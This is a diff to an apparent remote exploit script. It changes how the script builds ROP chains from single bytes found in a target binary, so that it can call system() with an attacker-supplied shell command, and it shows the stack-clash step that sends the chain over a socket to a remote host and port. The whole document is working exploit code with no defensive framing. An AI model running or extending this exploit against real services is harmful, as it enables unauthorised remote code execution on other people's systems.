@@ -111,8 +111,8 @@ def loadOffsets(binary, shellCmd):
     # Gadget to jump on the result of dlsym (address of system)
     gadgets['jeax'] = ropSearchJmp(elf, "jmp eax")
 
-    system_chunks.extend(searchStringChunks(elf, "system\x00"))
-    cmd_chunks.extend(searchStringChunks(elf, shellCmd + "\x00"))
+    system_chunks.extend(searchStringChunksLazy(elf, "system\x00"))
+    cmd_chunks.extend(searchStringChunksLazy(elf, shellCmd + "\x00"))
 
     # get the address of the first writable segment to store strings
     writable_address = elf.writable_segments[0].header.p_paddr
@@ -129,6 +129,23 @@ def generateStrncpyChain(dst, chunks):
 
     return chain
 
+# only search for single chars
+def searchStringChunksLazy(elf, string):
+    chunks = []
+    for b in string:
+        res = [_ for _ in elf.search(b)]
+        if len(res) > 0:
+            chunks.append((res[0], 1))
+        else:
+            raise
+
+    if len(string) != len(chunks):
+        raise
+
+    return chunks
+
+# [bugged, some problem with dots, not used]
+# search chunks of string
 def searchStringChunks(elf, string):
     chunks = []
     total = len(string)
@@ -195,7 +212,7 @@ def stackClash(ip, port, ropChain):
     print("Sending payload")
 
     # 3) Send ROP chain
-    socketSend(s1, ropChain) # thread A writes the ROP chain in the stack of thread B 
+    socketSend(s1, ropChain) # thread A writes the ROP chain in the stack of thread B
 
     print("Starting exploit")
 
